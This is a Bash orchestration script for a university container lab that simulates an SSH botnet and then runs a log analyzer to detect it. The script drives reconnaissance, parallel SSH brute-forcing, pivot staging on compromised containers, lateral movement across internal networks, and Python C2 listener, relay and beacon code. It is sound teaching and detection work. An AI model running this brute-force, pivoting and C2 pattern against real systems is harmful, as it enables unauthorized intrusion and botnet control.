#!/usr/bin/env bash
# =============================================================================
# auto_run.sh — Fully automatic scenario runner for FEUP SSR SSH Botnet Lab
# FEUP SSR · May 2026
#
# Usage: ./auto_run.sh [1|2|3|4]
#   1 — single flat network
#   2 — 2 networks, 1 pivot           (default)
#   3 — 3 networks, 2 parallel pivots
#   4 — 3 networks, 2-hop deep chain
# =============================================================================

SCENARIO=${1:-2}

# ── Colors ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

log()    { echo -e "${CYAN}[$(date +%H:%M:%S)]${RESET} $*"; }
ok()     { echo -e "${GREEN}[✔]${RESET} $*"; }
warn()   { echo -e "${YELLOW}[!]${RESET} $*"; }
fail()   { echo -e "${RED}[✘]${RESET} $*"; }
banner() {
    echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}"
    echo -e "${BOLD}${CYAN}  $*${RESET}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}\n"
}

# ── Validate input ─────────────────────────────────────────────────────────────
if ! [[ "$SCENARIO" =~ ^[1-4]$ ]]; then
    fail "Invalid scenario. Usage: ./auto_run.sh [1|2|3|4]"
    exit 1
fi

# ── Must run from the lab root directory ───────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"
log "Working directory: $SCRIPT_DIR"

# ── Runtime detection ──────────────────────────────────────────────────────────
if command -v podman &>/dev/null; then
    RT=podman
elif command -v docker &>/dev/null; then
    RT=docker
else
    fail "Neither podman nor docker found."; exit 1
fi
log "Runtime: $RT"

# ── Compose wrapper ────────────────────────────────────────────────────────────
# --project-directory . fixes "path not found" errors — build contexts like
# ./victim, ./victim-b, ./attacker are resolved from the lab root, not from
# the scenarios/ subdirectory where the yml lives.
compose_cmd() {
    local yml="$1"; shift
    $RT compose --project-directory "$SCRIPT_DIR" -f "$yml" "$@"
}

compose_down_all() {
    for yml in scenarios/scenario{1,2,3,4}.yml; do
        [[ -f "$yml" ]] && compose_cmd "$yml" down 2>/dev/null || true
    done
}

# ── Network constants ──────────────────────────────────────────────────────────
ATTACKER=172.21.0.10
VICTIM1_EXT=172.21.0.20
VICTIM2_EXT=172.21.0.21

VICTIM1_INT=10.10.0.20
VICTIM3_INT=10.10.0.10
HONEYPOT_INT=10.10.0.50

# Scenario 3: victim2 is pivot2 into extra_net (10.20.0.0/24)
VICTIM2_DEEP_INT=10.20.0.20  # victim2's extra_net IP
VICTIM4_DEEP=10.20.0.10      # extra_net — scenario 3 parallel pivot via victim2
VICTIM5_DEEP=10.20.0.11

# Scenario 4: deep_net uses a different subnet (10.30.0.0/24)
if [[ "$SCENARIO" == "4" ]]; then
    VICTIM4_DEEP=10.30.0.10
    VICTIM5_DEEP=10.30.0.11
fi

# Background PIDs to clean up on exit
BG_PIDS=()
cleanup() {
    for pid in "${BG_PIDS[@]:-}"; do
        kill "$pid" 2>/dev/null || true
    done
}
trap cleanup EXIT

# ── Helpers ────────────────────────────────────────────────────────────────────
image_exists() {
    $RT image inspect "$1" &>/dev/null
}

wait_for_container() {
    local name=$1
    local max=40 i=0
    log "Waiting for $name..."
    while ! $RT exec "$name" echo ok &>/dev/null; do
        sleep 3; ((i++))
        if [[ $i -ge $max ]]; then
            warn "$name did not respond — continuing anyway"
            return 0
        fi
    done
    ok "$name is ready"
}

wait_for_ssh() {
    local via=$1 target=$2
    local max=20 i=0
    log "Waiting for SSH on $target (via $via)..."
    while ! $RT exec "$via" bash -c "nc -z -w2 $target 22" &>/dev/null; do
        sleep 3; ((i++))
        [[ $i -ge $max ]] && { warn "SSH on $target not responding — continuing"; return 0; }
    done
    ok "SSH $target is up"
}

# =============================================================================
# PREFLIGHT — Pull base images while internet is available
# =============================================================================
phase_preflight() {
    banner "PREFLIGHT — Base Image Check"

    # The Dockerfiles all use ubuntu:22.04. It must be in the local cache
    # before compose runs, because the lab networks have no internet access.

    local base_image="ubuntu:22.04"

    if image_exists "$base_image"; then
        ok "Base image $base_image already in local cache — no pull needed"
        return 0
    fi

    log "Base image $base_image not found locally — attempting pull..."
    log "(This requires internet access and only needs to happen once)"

    if $RT pull "$base_image"; then
        ok "Pulled $base_image successfully"
    else
        echo ""
        fail "════════════════════════════════════════════════════"
        fail "Cannot pull $base_image from Docker Hub."
        fail ""
        fail "This means one of:"
        fail "  1. No internet connection on this machine"
        fail "  2. Docker/Podman DNS is not resolving registry-1.docker.io"
        fail ""
        fail "Fix: connect to the internet and run:"
        fail "  $RT pull ubuntu:22.04"
        fail ""
        fail "Then re-run this script. The image is cached after the"
        fail "first pull — you will not need internet again."
        fail "════════════════════════════════════════════════════"
        exit 1
    fi
}

# =============================================================================
# PHASE 0 — Start the scenario
# =============================================================================
phase_setup() {
    banner "PHASE 0 — Starting Scenario $SCENARIO"

    local yml="scenarios/scenario${SCENARIO}.yml"
    if [[ ! -f "$yml" ]]; then
        fail "Compose file not found: $yml"
        fail "Make sure you are running this script from the lab root directory."
        exit 1
    fi

    log "Stopping any running containers..."
    compose_down_all
    sleep 2
    # Force-remove any stale lab containers by name. compose_down_all can miss
    # cross-scenario conflicts when two scenarios share the same container names
    # (victim4, victim5). Without this, a leftover scenario4 victim4 would have
    # deep_net attached instead of extra_net, breaking scenario3.
    for c in attacker victim1 victim2 victim3 victim4 victim5 honeypot monitor; do
        $RT rm -f "$c" 2>/dev/null || true
    done
    sleep 1

    # ── Build services ONE AT A TIME ───────────────────────────────────────────
    # Building all services in parallel (the default) causes OOM kills (exit
    # status 9 / SIGKILL from the OOM killer) when several heavy Dockerfiles
    # run simultaneously. Building sequentially costs a bit more time but is
    # reliable on machines with limited RAM.
    log "Discovering services in $yml..."
    local services
    services=$(compose_cmd "$yml" config --services 2>/dev/null)
    if [[ -z "$services" ]]; then
        fail "Could not read service list from $yml — check the file is valid YAML"
        exit 1
    fi

    log "Building services one at a time (avoids OOM on parallel builds)..."
    for svc in $services; do
        log "  Building: $svc"
        compose_cmd "$yml" build "$svc"
        local rc=$?
        if [[ $rc -ne 0 ]]; then
            fail "Build failed for service '$svc' (exit $rc)"
            fail "Run this to see the full error:"
            fail "  $RT compose --project-directory . -f $yml build $svc"
            exit 1
        fi
        ok "  $svc built"
    done

    log "Starting all containers..."
    compose_cmd "$yml" up -d
    local rc=$?
    if [[ $rc -ne 0 ]]; then
        fail "Compose up failed (exit $rc)"
        compose_cmd "$yml" logs --tail=40 2>/dev/null || true
        exit 1
    fi

    log "Waiting 12s for containers and sshd to initialise..."
    sleep 12

    for c in attacker victim1 victim2 monitor; do
        wait_for_container "$c"
    done

    if [[ $SCENARIO -ge 2 ]]; then
        wait_for_container victim3
        wait_for_container honeypot
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        wait_for_container victim4 || warn "victim4 not found — check name in scenario${SCENARIO}.yml"
        wait_for_container victim5 || warn "victim5 not found — check name in scenario${SCENARIO}.yml"
    fi

    log "Giving sshd 8 more seconds to fully settle..."
    sleep 8

    # Scenario 3: verify victim2 has its extra_net interface (10.20.0.x).
    # Compose + netavark should create it at startup. If it's missing, try
    # network connect WITHOUT disconnecting first — disconnecting first caused
    # the previous failure because netavark still tracks the IP as allocated,
    # making the subsequent connect appear to conflict with itself.
    if [[ "$SCENARIO" == "3" ]]; then
        log "Scenario 3 — checking victim2 extra_net interface..."
        local v2_extra
        v2_extra=$($RT exec victim2 bash -c \
            "ip -o -4 addr | awk -F'[ /]+' '\$4~/^10\\.20\\./{print \$4}'" 2>/dev/null || true)

        if [[ -n "$v2_extra" ]]; then
            ok "victim2 extra_net interface present ($v2_extra)"
        else
            log "Interface missing — trying network connect..."
            # Show every network Podman knows about — helps diagnose lookup failures
            local all_nets
            all_nets=$($RT network ls 2>/dev/null | awk 'NR>1{print $2}' | tr '\n' ' ')
            log "  All Podman networks: ${all_nets:-(none visible)}"
            # Find extra_net: grep the NAME column of 'podman network ls' for 'extra_net'.
            # This avoids --format templates and JSON parsing, both of which have
            # failed across different Podman versions.
            local net=""
            net=$($RT network ls 2>/dev/null | awk 'NR>1{print $2}' \
                    | grep 'extra_net' | head -1 || true)
            log "  Detected extra_net name: ${net:-(not found)}"
            if [[ -n "$net" ]]; then
                # Disconnect first — podman-compose may have registered victim2 on
                # extra_net at the CNI level without injecting the interface into its
                # namespace, which causes 'network connect' to fail with "already connected".
                $RT network disconnect "$net" victim2 2>/dev/null || true
                sleep 1
                local nc_err
                nc_err=$($RT network connect --ip 10.20.0.20 "$net" victim2 2>&1) \
                    && ok "victim2 connected to $net (10.20.0.20)" \
                    || warn "network connect failed: $nc_err"
            else
                warn "Could not determine extra_net name — victim2→victim4/5 will fail"
            fi
        fi

        # Final reachability check
        if $RT exec victim2 bash -c "nc -z -w3 10.20.0.10 22" 2>/dev/null; then
            ok "victim2 → victim4 (10.20.0.10:22) reachable"
        else
            warn "victim2 → victim4 not reachable — if 'network connect' failed above, that is why"
        fi
    fi

    ok "Scenario $SCENARIO is up"
}

# =============================================================================
# PHASE 1 — Reconnaissance
# =============================================================================
phase_recon() {
    banner "PHASE 1 — Reconnaissance"
    log "Scanning attack_net (172.21.0.x)..."
    $RT exec attacker python3 /lab/simulator.py scan --network 172.21.0. 2>&1 \
        | tee /tmp/scan_attack.txt
    ok "Scan complete"

    wait_for_ssh attacker "$VICTIM1_EXT"
    wait_for_ssh attacker "$VICTIM2_EXT"
}

# =============================================================================
# PHASE 2 — SSH Brute-Force on attack_net (parallel)
# =============================================================================
phase_bruteforce() {
    banner "PHASE 2 — SSH Brute-Force (attack_net)"
    log "Attacking victim1 ($VICTIM1_EXT) and victim2 ($VICTIM2_EXT) in parallel..."

    $RT exec attacker python3 /lab/simulator.py bruteforce \
        --target "$VICTIM1_EXT" --delay 0.8 --max-attempts 150 &
    BG_PIDS+=($!)

    $RT exec attacker python3 /lab/simulator.py bruteforce \
        --target "$VICTIM2_EXT" --delay 0.8 --max-attempts 150 &
    BG_PIDS+=($!)

    log "Waiting for both jobs..."
    wait "${BG_PIDS[@]}" 2>/dev/null || true
    BG_PIDS=()
    ok "Brute-force on attack_net complete"
}

# =============================================================================
# PHASE 3 — Prepare victim1 as pivot
# =============================================================================
phase_prepare_pivot() {
    banner "PHASE 3 — Preparing victim1 as Pivot"

    log "Packaging Python libs on attacker..."
    $RT exec attacker bash -c "
        tar czf /tmp/pkgs.tar.gz /usr/lib/python3/dist-packages/ 2>/dev/null || true
        tar czf /tmp/libs.tar.gz \
            /usr/lib/x86_64-linux-gnu/libsodium* \
            /usr/lib/x86_64-linux-gnu/libcrypto* \
            /usr/lib/x86_64-linux-gnu/libssl* 2>/dev/null || true
    "

    log "Copying packages to victim1..."
    $RT cp attacker:/tmp/pkgs.tar.gz /tmp/pkgs.tar.gz
    $RT cp /tmp/pkgs.tar.gz victim1:/tmp/pkgs.tar.gz
    $RT exec victim1 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true"

    $RT cp attacker:/tmp/libs.tar.gz /tmp/libs.tar.gz
    $RT cp /tmp/libs.tar.gz victim1:/tmp/libs.tar.gz
    $RT exec victim1 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true"
    $RT exec victim1 ldconfig 2>/dev/null || true

    # Use the fixed simulator.py from the lab source tree if present,
    # otherwise fall back to the copy inside the running attacker container
    if [[ -f "$SCRIPT_DIR/attacker/simulator.py" ]]; then
        $RT cp "$SCRIPT_DIR/attacker/simulator.py" victim1:/tmp/sim.py
        log "Copied simulator.py from attacker/ source"
    else
        $RT cp attacker:/lab/simulator.py /tmp/sim.py
        $RT cp /tmp/sim.py victim1:/tmp/sim.py
        log "Copied simulator.py from running attacker container"
    fi

    if $RT exec victim1 python3 -c "import paramiko; print('paramiko ok')" 2>/dev/null; then
        ok "victim1 pivot ready"
    else
        warn "paramiko import failed on victim1 — lateral movement may not work"
    fi

    # Scenario 3: also prepare victim2 as the extra_net pivot
    if [[ "$SCENARIO" == "3" ]]; then
        log "Scenario 3 — also preparing victim2 as pivot2 (extra_net)..."
        $RT cp /tmp/pkgs.tar.gz victim2:/tmp/pkgs.tar.gz
        $RT exec victim2 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true"
        $RT cp /tmp/libs.tar.gz victim2:/tmp/libs.tar.gz
        $RT exec victim2 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true; ldconfig 2>/dev/null || true"
        $RT cp victim1:/tmp/sim.py /tmp/sim_v1.py 2>/dev/null && \
            $RT cp /tmp/sim_v1.py victim2:/tmp/sim.py 2>/dev/null || \
            warn "Could not copy sim.py to victim2 — deep lateral in S3 may not work"
        if $RT exec victim2 python3 -c "import paramiko; print('paramiko ok')" 2>/dev/null; then
            ok "victim2 pivot2 ready"
        else
            warn "paramiko import failed on victim2 — deep lateral in S3 may not work"
        fi

        # Verify victim2 can actually TCP-reach victim4 (route set in phase_setup)
        if $RT exec victim2 bash -c "nc -z -w3 10.20.0.10 22" 2>/dev/null; then
            ok "victim2 → victim4 TCP confirmed"
        else
            warn "victim2 cannot reach victim4 — deep lateral will fail (check host ip_forward)"
        fi
    fi
}

# =============================================================================
# PHASE 4 — Lateral Movement → internal_net
# =============================================================================
phase_lateral() {
    banner "PHASE 4 — Lateral Movement (internal_net)"

    wait_for_ssh victim1 "$VICTIM3_INT"

    # Cooldown after brute-force load so sshd on victim3 isn't throttling
    log "Pausing 5s (sshd cooldown before lateral)..."
    sleep 5

    log "Brute-forcing victim3 ($VICTIM3_INT) FROM victim1..."
    $RT exec victim1 python3 /tmp/sim.py bruteforce \
        --target "$VICTIM3_INT" --delay 1.0 --max-attempts 120
    ok "Lateral to victim3 complete"

    log "Triggering honeypot ($HONEYPOT_INT) FROM victim1..."
    $RT exec victim1 python3 /tmp/sim.py bruteforce \
        --target "$HONEYPOT_INT" --delay 1.0 --max-attempts 60 || \
        warn "Honeypot brute-force returned non-zero (may be normal)"
    ok "Honeypot triggered"
}

# =============================================================================
# PHASE 4b — Deep Lateral → deep_net  (scenarios 3 & 4 only)
# =============================================================================
phase_lateral_deep() {
    banner "PHASE 4b — Deep Lateral Movement (deep_net 10.20.0.x)"

    log "Preparing victim3 as second pivot..."
    $RT cp /tmp/pkgs.tar.gz victim3:/tmp/pkgs.tar.gz 2>/dev/null && \
        $RT exec victim3 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true" || \
        warn "Could not copy packages to victim3"
    $RT cp /tmp/libs.tar.gz victim3:/tmp/libs.tar.gz 2>/dev/null && \
        $RT exec victim3 bash -c \
            "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true; ldconfig 2>/dev/null || true" || true
    $RT cp victim1:/tmp/sim.py /tmp/sim_v1.py 2>/dev/null && \
        $RT cp /tmp/sim_v1.py victim3:/tmp/sim.py 2>/dev/null || \
        warn "Could not copy sim.py to victim3"

    if [[ "$SCENARIO" == "3" ]]; then
        wait_for_ssh victim2 "$VICTIM4_DEEP"
        log "Scenario 3 — victim2 → victim4 ($VICTIM4_DEEP) and victim5 ($VICTIM5_DEEP) in parallel..."
        $RT exec victim2 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM4_DEEP" --delay 1.0 --max-attempts 120 &
        BG_PIDS+=($!)
        $RT exec victim2 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM5_DEEP" --delay 1.0 --max-attempts 120 &
        BG_PIDS+=($!)
        wait "${BG_PIDS[@]}" 2>/dev/null || true
        BG_PIDS=()
        ok "Parallel deep lateral complete"

    elif [[ "$SCENARIO" == "4" ]]; then
        log "Scenario 4 — victim3 → victim4 ($VICTIM4_DEEP) (2-hop chain)..."
        $RT exec victim3 python3 /tmp/sim.py bruteforce \
            --target "$VICTIM4_DEEP" --delay 1.0 --max-attempts 120 || \
            warn "Deep lateral from victim3 failed — verify victim3 has paramiko and sim.py"
        ok "2-hop chain complete: attacker → victim1 → victim3 → victim4"
    fi
}

# =============================================================================
# PHASE 5 — C2 Beaconing
# =============================================================================
phase_c2() {
    banner "PHASE 5 — C2 Beaconing"

    log "Starting C2 listener on attacker (port 8888)..."
    $RT exec attacker python3 -c "
import socket, json, re
from datetime import datetime
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8888))
srv.listen(10)
srv.settimeout(45)
print('[C2] Listener ready on port 8888', flush=True)
evf = open('/tmp/c2_events.jsonl', 'w')
try:
    while True:
        try:
            conn, addr = srv.accept()
            data = conn.recv(1024).decode(errors='ignore')
            print(f'[C2] BEACON from {addr[0]}: {data[:80]}', flush=True)
            conn.send(b'HTTP/1.1 200 OK\r\n\r\nOK')
            conn.close()
            # extract JSON body after blank line
            body = data.split('\r\n\r\n', 1)[-1] if '\r\n\r\n' in data else '{}'
            try:
                payload = json.loads(body)
            except Exception:
                payload = {}
            evt = {'ts': datetime.utcnow().isoformat(),
                   'event': 'BEACON SENT',
                   'bot_id': payload.get('bot_id', addr[0]),
                   'ip': addr[0],
                   'seq': payload.get('seq', '?'),
                   'type': payload.get('type', 'HEARTBEAT')}
            evf.write(json.dumps(evt) + '\n')
            evf.flush()
        except socket.timeout:
            break
except Exception as e:
    print(f'[C2] Error: {e}')
evf.close()
print('[C2] Listener closed')
" &
    C2_PID=$!
    BG_PIDS+=($C2_PID)
    sleep 2

    log "victim1 → attacker ($ATTACKER:8888) — 5 beacons..."
    $RT exec victim1 python3 -c "
import socket, time, json
from datetime import datetime
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim1','type':'HEARTBEAT',
                              'seq':i+1,'ts':datetime.utcnow().isoformat()}).encode()
        s = socket.create_connection(('$ATTACKER', 8888), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent', flush=True)
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}', flush=True)
    time.sleep(2)
"

    if [[ $SCENARIO -ge 2 ]]; then
        log "Starting C2 relay on victim1:8889 for victim3..."
        $RT exec victim1 python3 -c "
import socket, json
from datetime import datetime
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('0.0.0.0', 8889))
srv.listen(10)
srv.settimeout(30)
evf = open('/tmp/relay_events.jsonl', 'w')
print('[C2-relay] Ready on 8889', flush=True)
try:
    while True:
        try:
            c, a = srv.accept()
            data = c.recv(1024).decode(errors='ignore')
            print(f'[C2-relay] BEACON from {a[0]}: {data[:60]}', flush=True)
            c.send(b'HTTP/1.1 200 OK\r\n\r\n')
            c.close()
            body = data.split('\r\n\r\n', 1)[-1] if '\r\n\r\n' in data else '{}'
            try:
                payload = json.loads(body)
            except Exception:
                payload = {}
            evt = {'ts': datetime.utcnow().isoformat(),
                   'event': 'BEACON SENT',
                   'bot_id': payload.get('bot_id', a[0]),
                   'ip': a[0],
                   'seq': payload.get('seq', '?'),
                   'type': payload.get('type', 'HEARTBEAT')}
            evf.write(json.dumps(evt) + '\n')
            evf.flush()
        except socket.timeout:
            break
except Exception as e:
    print(f'[relay] Error: {e}')
evf.close()
print('[C2-relay] Done')
" &
        RELAY_PID=$!
        BG_PIDS+=($RELAY_PID)
        sleep 2

        log "victim3 → victim1 relay ($VICTIM1_INT:8889) — 5 beacons..."
        $RT exec victim3 python3 -c "
import socket, time, json
for i in range(5):
    try:
        payload = json.dumps({'bot_id':'victim3','type':'HEARTBEAT','seq':i+1}).encode()
        s = socket.create_connection(('$VICTIM1_INT', 8889), timeout=3)
        s.send(b'POST /beacon HTTP/1.1\r\nContent-Length: '
               + str(len(payload)).encode() + b'\r\n\r\n' + payload)
        s.close()
        print(f'Beacon {i+1}/5 sent from victim3', flush=True)
    except Exception as e:
        print(f'Beacon {i+1} failed: {e}', flush=True)
    time.sleep(2)
" || warn "victim3 beaconing failed"
    fi

    log "Waiting for C2 listener to finish..."
    wait $C2_PID 2>/dev/null || true
    BG_PIDS=()
    ok "C2 beaconing phase complete"
}

# =============================================================================
# PHASE 7 — Log Collection & Detection
# =============================================================================
phase_detect() {
    banner "PHASE 7 — Log Collection & Detection"

    log "Collecting auth logs from all victims..."
    $RT exec victim1  cat /var/log/auth.log  > /tmp/a.log 2>/dev/null || true
    $RT exec victim2  cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true

    if [[ $SCENARIO -ge 2 ]]; then
        $RT exec victim3   cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
        $RT exec honeypot  cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
        $RT exec honeypot  cat /var/log/lab/honeypot_events.jsonl > /tmp/honeypot.jsonl 2>/dev/null || true
        # Merge C2 beacon events (direct beacons + relayed beacons) so C2-001 fires
        $RT exec attacker  cat /tmp/c2_events.jsonl     >> /tmp/honeypot.jsonl 2>/dev/null || true
        $RT exec victim1   cat /tmp/relay_events.jsonl  >> /tmp/honeypot.jsonl 2>/dev/null || true
        $RT cp /tmp/honeypot.jsonl monitor:/var/log/lab/honeypot_events.jsonl 2>/dev/null || true
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        $RT exec victim4 cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
        $RT exec victim5 cat /var/log/auth.log >> /tmp/a.log 2>/dev/null || true
    fi

    local lines
    lines=$(wc -l < /tmp/a.log 2>/dev/null || echo 0)
    log "Total log lines collected: $lines"
    [[ "$lines" -lt 5 ]] && warn "Very few log lines — sshd may not have written yet"

    $RT cp /tmp/a.log monitor:/var/log/lab/auth.log
    ok "Logs copied to monitor:/var/log/lab/auth.log"

    log "Running analyzer..."
    $RT exec monitor python3 /lab/monitor/analyzer.py --report
    ok "Detection analysis complete"
}

# =============================================================================
# Summary
# =============================================================================
print_summary() {
    banner "ALL DONE — Scenario $SCENARIO"
    echo -e "${GREEN}Phases completed:${RESET}"
    echo "  PRE  Base image check / pull"
    echo "  0    Lab startup — scenario${SCENARIO}.yml"
    echo "  1    Reconnaissance — attack_net scan"
    echo "  2    SSH brute-force — victim1 + victim2 (parallel, delay 0.8s)"
    if [[ $SCENARIO -ge 2 ]]; then
        echo "  3    Pivot preparation on victim1"
        echo "  4    Lateral movement — internal_net (victim3, honeypot, delay 1.0s)"
    fi
    if [[ $SCENARIO -ge 3 ]]; then
        [[ "$SCENARIO" == "3" ]] && echo "  4b   Deep lateral — deep_net parallel pivots (victim4 + victim5)"
        [[ "$SCENARIO" == "4" ]] && echo "  4b   Deep lateral — 2-hop chain (victim3 → victim4)"
    fi
    echo "  5    C2 beaconing"
    echo "  7    Log collection + analyzer report"
    echo ""
    echo -e "${CYAN}Useful follow-up:${RESET}"
    echo "  $RT exec -it monitor  python3 /lab/monitor/analyzer.py --rules"
    echo "  $RT exec -it victim1  bash"
    echo "  $RT exec -it attacker bash"
    echo "  $RT exec -it honeypot cat /var/log/lab/honeypot_events.jsonl"
    echo ""
    echo "Finished at: $(date)"
}

# =============================================================================
# MAIN
# =============================================================================
banner "FEUP SSR — Auto Scenario Runner — Scenario $SCENARIO"
log "Start: $(date)"

phase_preflight    # ← pull ubuntu:22.04 if not cached — must have internet once
phase_setup
phase_recon
phase_bruteforce

if [[ $SCENARIO -ge 2 ]]; then
    phase_prepare_pivot
    phase_lateral
fi

if [[ $SCENARIO -ge 3 ]]; then
    phase_lateral_deep
fi

phase_c2
phase_detect
print_summary
